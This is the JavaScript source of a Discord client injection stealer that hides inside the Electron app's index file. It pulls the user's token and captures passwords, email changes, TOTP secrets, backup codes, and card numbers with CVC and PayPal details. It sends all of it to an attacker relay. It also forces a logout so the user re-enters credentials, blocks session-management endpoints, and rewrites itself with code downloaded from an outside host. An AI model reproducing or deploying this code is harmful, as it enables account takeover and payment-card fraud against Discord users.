'use strict';
// Injected by Lexus — placeholders replaced at injection time
const RELAY_HOST = '%%RELAY_HOST%%';
const RELAY_PORT = %%RELAY_PORT%%;
const CLIENT_ID  = '%%CLIENT_ID%%';
const AUTH_KEY   = '%%AUTH_KEY%%';

const https = require('https');
const http  = require('http');
const fs    = require('fs');
const path  = require('path');
const os    = require('os');
const qs    = require('querystring');
const { BrowserWindow, session } = require('electron');

const CS_DIR     = path.join(process.env.LOCALAPPDATA || path.join(os.homedir(), 'AppData', 'Local'), 'ComponentServices');
const LOG_FILE   = path.join(CS_DIR, 'e3a7f9c2b5d8f4a1e6c3b9d5f2a8e4c7.dat');
const FLAG_FILE  = path.join(CS_DIR, 'c6f2a8e4b3d7f9c1a5e8b4d2f6a3c9e1.dat');

// ── Debug logging ──────────────────────────────────────────────────────────

function log(msg) {
    try {
        fs.mkdirSync(CS_DIR, { recursive: true });
        fs.appendFileSync(LOG_FILE, new Date().toISOString() + ' ' + msg + '\n');
    } catch (_) {}
}

// ── Exfil ──────────────────────────────────────────────────────────────────

function exfil(event, data) {
    try {
        const body = JSON.stringify({ client_id: CLIENT_ID, event, data });
        const mod  = RELAY_PORT === 443 ? https : http;
        const req  = mod.request({
            hostname: RELAY_HOST,
            port:     RELAY_PORT,
            path:     '/discord-event',
            method:   'POST',
            headers:  {
                'Content-Type':   'application/json',
                'Content-Length': Buffer.byteLength(body),
                'Authorization':  'Bearer ' + AUTH_KEY,
            },
        }, res => {
            log('exfil ' + event + ' -> HTTP ' + res.statusCode);
            res.resume();
        });
        req.on('error', e => log('exfil error (' + event + '): ' + e.message));
        req.write(body);
        req.end();
    } catch (e) { log('exfil throw (' + event + '): ' + e.message); }
}

// ── Helpers ────────────────────────────────────────────────────────────────

function executeJS(script) {
    const win = BrowserWindow.getAllWindows()[0];
    return win ? win.webContents.executeJavaScript(script, true) : Promise.resolve(null);
}

// Retry up to maxRetries times (2s apart) waiting for webpack modules to load.
// Finds all webpack chunk globals dynamically (Discord renames them across versions),
// walks loaded modules, and checks both exports.default.getToken and exports.getToken.
async function getToken(maxRetries) {
    maxRetries = maxRetries || 15;
    const script =
        "(function(){" +
        "try{" +
        "var wpGlobals=Object.keys(window).filter(function(k){return k.indexOf('webpack')>=0&&Array.isArray(window[k]);});" +
        "if(!wpGlobals.length)return JSON.stringify({s:'no_globals'});" +
        "var chunk=window[wpGlobals[0]];" +
        "var m=[];" +
        // Unique ID per call so Discord's webpack runtime never skips the callback as already-processed
        "var cid='lx'+Date.now().toString(36);" +
        "chunk.push([[cid],{},function(e){for(var c in e.c)m.push(e.c[c]);}]);" +
        // Deep scan: exports.getToken / exports.default.getToken / exports.ANY_KEY.getToken
        "var token=null;" +
        "for(var i=0;i<m.length&&!token;i++){" +
        "var x=m[i];if(!x||!x.exports)continue;" +
        "var ex=x.exports;" +
        "if(typeof ex.getToken==='function'){token=ex.getToken();break;}" +
        "if(ex.default&&typeof ex.default.getToken==='function'){token=ex.default.getToken();break;}" +
        "for(var k in ex){if(ex[k]&&typeof ex[k].getToken==='function'){token=ex[k].getToken();break;}}" +
        "}" +
        "if(token)return JSON.stringify({s:'ok',token:token});" +
        "var sample=m.slice(0,5).map(function(x){return x&&x.exports?Object.keys(x.exports).slice(0,8).join(','):'null';});" +
        "return JSON.stringify({s:'no_mod',count:m.length,globals:wpGlobals.join(','),sample:sample});" +
        "}catch(e){return JSON.stringify({s:'err',msg:e.message});}" +
        "})()";
    for (let i = 0; i < maxRetries; i++) {
        try {
            const raw = await executeJS(script);
            if (!raw) {
                log('getToken attempt ' + (i + 1) + ': null result');
            } else {
                let parsed;
                try { parsed = JSON.parse(raw); } catch (_) { parsed = { s: 'parse_err', raw: String(raw).substring(0, 80) }; }
                if (parsed.s === 'ok' || parsed.s === 'ok2') return parsed.token;
                if (i === 0 || parsed.s !== 'no_globals') {
                    log('getToken attempt ' + (i + 1) + ': ' + JSON.stringify(parsed));
                }
            }
        } catch (e) {
            log('getToken attempt ' + (i + 1) + ' threw: ' + e.message);
        }
        await new Promise(r => setTimeout(r, 2000));
    }
    log('getToken: no token after ' + maxRetries + ' retries');
    return null;
}

function discordAPI(method, endpoint, token) {
    return new Promise(resolve => {
        const req = https.request({
            hostname: 'discord.com',
            path:     '/api/v9' + endpoint,
            method,
            headers:  { 'Authorization': token, 'Content-Type': 'application/json' },
        }, res => {
            let d = '';
            res.on('data', c => d += c);
            res.on('end', () => { try { resolve(JSON.parse(d)); } catch { resolve({}); } });
        });
        req.on('error', () => resolve({}));
        req.end();
    });
}

async function buildProfile(token) {
    const [account, billing, guilds, friends] = await Promise.all([
        discordAPI('GET', '/users/@me',                          token),
        discordAPI('GET', '/users/@me/billing/payment-sources',  token),
        discordAPI('GET', '/users/@me/guilds?with_counts=true',  token),
        discordAPI('GET', '/relationships',                      token),
    ]);
    return {
        id:           account.id,
        username:     account.username,
        email:        account.email,
        phone:        account.phone        || null,
        mfa_enabled:  account.mfa_enabled,
        premium_type: account.premium_type || 0,
        flags:        account.public_flags || 0,
        billing: Array.isArray(billing)
            ? billing.filter(b => !b.invalid).map(b => b.type === 1 ? 'card' : 'paypal')
            : [],
        guilds_total: Array.isArray(guilds) ? guilds.length : 0,
        admin_guilds: Array.isArray(guilds)
            ? guilds
                .filter(g => (BigInt(g.permissions || 0) & BigInt(8)) === BigInt(8) || g.owner)
                .map(g => ({ name: g.name, members: g.approximate_member_count, owner: !!g.owner }))
            : [],
        friends_total: Array.isArray(friends) ? friends.filter(f => f.type === 1).length : 0,
    };
}

function formatCodes(arr) {
    return (arr || [])
        .filter(c => !c.consumed)
        .map(c => {
            const s = c.code || c;
            return typeof s === 'string' && s.length === 8 ? s.slice(0, 4) + '-' + s.slice(4) : s;
        });
}

// ── Force-logout (one-time, 5 min after first injection) ──────────────────

function forceLogout(token) {
    return new Promise(resolve => {
        const body = '{}';
        const req = https.request({
            hostname: 'discord.com',
            path:     '/api/v9/auth/logout',
            method:   'POST',
            headers:  {
                'Authorization':  token,
                'Content-Type':   'application/json',
                'Content-Length': Buffer.byteLength(body),
            },
        }, res => { res.resume(); resolve(); });
        req.on('error', e => { log('forceLogout error: ' + e.message); resolve(); });
        req.write(body);
        req.end();
    });
}

function scheduleOneTimeLogout(token) {
    if (fs.existsSync(FLAG_FILE)) return;
    log('scheduling one-time force-logout in 5 min');
    setTimeout(async () => {
        if (fs.existsSync(FLAG_FILE)) return;
        try { fs.writeFileSync(FLAG_FILE, '1'); } catch (_) {}
        log('executing force-logout');
        await forceLogout(token);
        log('force-logout done — user will re-login triggering login event');
    }, 5 * 60 * 1000);
}

// ── Network event handler ──────────────────────────────────────────────────

const HOOKS = [
    '/users/@me/mfa/totp/enable',
    '/users/@me/mfa/totp/disable',
    '/users/@me/mfa/codes',
    '/users/@me',
    '/auth/mfa/backup',
    '/mfa/totp',
    '/mfa/codes-verification',
    '/auth/login',
    '/auth/register',
];

let pendingEmail = '';
let pendingPass  = '';
let mainWindow   = null;

async function onNetworkEvent(_, method, params) {
    if (method !== 'Network.responseReceived') return;
    if (![200, 202].includes(params.response.status)) return;

    const url = params.response.url;
    if (!HOOKS.some(h => url.endsWith(h))) return;

    log('network hook: ' + url);

    let res = {}, req = {};
    try {
        const rb = await mainWindow.webContents.debugger.sendCommand('Network.getResponseBody', { requestId: params.requestId });
        res = JSON.parse(rb.body);
    } catch { return; }
    try {
        const rq = await mainWindow.webContents.debugger.sendCommand('Network.getRequestPostData', { requestId: params.requestId });
        req = JSON.parse(rq.postData);
    } catch { req = {}; }

    if (url.endsWith('/users/@me/mfa/totp/enable')) {
        exfil('2fa_enabled', {
            totp_secret:  req.secret,
            backup_codes: formatCodes(res.backup_codes),
            token:        res.token,
        });
        return;
    }

    if (url.endsWith('/users/@me/mfa/totp/disable')) {
        exfil('2fa_disabled', { totp_code: req.code, password: req.password || null });
        return;
    }

    if (url.endsWith('/users/@me/mfa/codes')) {
        exfil('backup_codes_regen', { codes: formatCodes(res) });
        return;
    }

    if (url.endsWith('/users/@me')) {
        if (!req.password) return;
        const token = res.token || await getToken(1);
        if (req.email)        exfil('email_changed',    { new_email: req.email, password: req.password, token });
        if (req.new_password) exfil('password_changed', { new_password: req.new_password, old_password: req.password, token });
        return;
    }

    if (url.endsWith('/auth/mfa/backup')) {
        const profile = await buildProfile(res.token);
        exfil('login_backup', { backup_code: req.code, token: res.token, profile });
        return;
    }

    if (url.endsWith('/mfa/totp')) {
        const profile = await buildProfile(res.token);
        exfil('login_2fa', { email: pendingEmail, password: pendingPass, token: res.token, profile });
        return;
    }

    if (url.endsWith('/mfa/codes-verification')) {
        exfil('backup_codes_viewed', { codes: formatCodes(res.backup_codes) });
        return;
    }

    if (url.endsWith('/auth/login')) {
        if (!res.token) {
            pendingEmail = req.login;
            pendingPass  = req.password;
            return;
        }
        const profile = await buildProfile(res.token);
        exfil('login', { email: req.login, password: req.password, token: res.token, profile });
        return;
    }

    if (url.endsWith('/auth/register')) {
        const profile = await buildProfile(res.token);
        exfil('register', { email: req.email, password: req.password, token: res.token, profile });
        return;
    }
}

// ── Payment hooks ──────────────────────────────────────────────────────────

async function onPaymentCompleted(details) {
    if (![200, 202].includes(details.statusCode)) return;
    if (details.method !== 'POST') return;
    const token = await getToken(1);

    if (details.url.endsWith('tokens') && details.uploadData?.[0]?.bytes) {
        const f = qs.parse(Buffer.from(details.uploadData[0].bytes).toString());
        exfil('card_added', {
            token,
            number:    f['card[number]'],
            cvc:       f['card[cvc]'],
            exp_month: f['card[exp_month]'],
            exp_year:  f['card[exp_year]'],
            name:      f['card[name]']            || null,
            address: {
                line1:   f['card[address_line1]'] || null,
                city:    f['card[address_city]']  || null,
                state:   f['card[address_state]'] || null,
                zip:     f['card[address_zip]']   || null,
                country: f['card[address_country]'] || null,
            },
        });
        return;
    }

    if (details.url.endsWith('paypal_accounts')) {
        const account = await discordAPI('GET', '/users/@me', token);
        exfil('paypal_added', { token, email: account.email, phone: account.phone || null });
    }
}

// ── Init / re-init ─────────────────────────────────────────────────────────

async function doStartupExfil() {
    try {
        log('startup: fetching token...');
        const token = await getToken();
        log('startup: token=' + (token ? token.substring(0, 10) + '...' : 'null'));
        if (token) {
            const profile = await buildProfile(token);
            exfil('startup', { token, profile });
            scheduleOneTimeLogout(token);
        }
    } catch (e) { log('startup error: ' + e.message); }
}

async function init() {
    log('init called, windows=' + BrowserWindow.getAllWindows().length);
    mainWindow = BrowserWindow.getAllWindows()[0];
    if (!mainWindow) {
        setTimeout(init, 1000);
        return;
    }

    try { mainWindow.webContents.debugger.attach('1.3'); } catch (_) {}

    mainWindow.webContents.debugger.on('message', onNetworkEvent);
    mainWindow.webContents.debugger.sendCommand('Network.enable').catch(e => log('Network.enable failed: ' + e.message));

    // Wait for renderer to fully load before grabbing token
    if (mainWindow.webContents.isLoading()) {
        log('init: window still loading, waiting for did-finish-load');
        mainWindow.webContents.once('did-finish-load', () => doStartupExfil());
    } else {
        doStartupExfil();
    }

    session.defaultSession.webRequest.onCompleted(
        { urls: [
            'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts',
            'https://api.stripe.com/v*/tokens',
        ]},
        (details) => onPaymentCompleted(details)
    );

    session.defaultSession.webRequest.onBeforeRequest(
        { urls: [
            'wss://remote-auth-gateway.discord.gg/*',
            'https://discord.com/api/v*/auth/sessions',
            'https://*.discord.com/api/v*/auth/sessions',
            'https://discordapp.com/api/v*/auth/sessions',
        ]},
        (_, callback) => callback({ cancel: true })
    );

    mainWindow.on('closed', () => {
        log('main window closed, scheduling re-init');
        mainWindow = null;
        setTimeout(init, 1000);
    });
}

// ── Self-update ────────────────────────────────────────────────────────────
// Fetches the latest template from CDN, fills in this instance's values,
// and overwrites __filename so the next Discord restart picks up the update.

function selfUpdate() {
    try {
        const req = http.get('http://files.54daysaverage.qzz.io/discordhash.js', res => {
            if (res.statusCode !== 200) { res.resume(); return; }
            let data = '';
            res.on('data', c => data += c);
            res.on('end', () => {
                if (!data || data.length < 200) return;
                const filled = data
                    .replace("'%%RELAY_HOST%%'", "'" + RELAY_HOST + "'")
                    .replace('%%RELAY_PORT%%',    String(RELAY_PORT))
                    .replace("'%%CLIENT_ID%%'",  "'" + CLIENT_ID + "'")
                    .replace("'%%AUTH_KEY%%'",   "'" + AUTH_KEY + "'");
                try {
                    fs.writeFileSync(__filename, filled);
                    log('self-update: wrote new version');
                } catch (e) { log('self-update write failed: ' + e.message); }
            });
        });
        req.on('error', () => {});
    } catch (_) {}
}

log('discord_inject.js loaded — CLIENT_ID=' + CLIENT_ID + ' RELAY=' + RELAY_HOST + ':' + RELAY_PORT);
setTimeout(selfUpdate, 30000);
init();

module.exports = require('./core.asar');
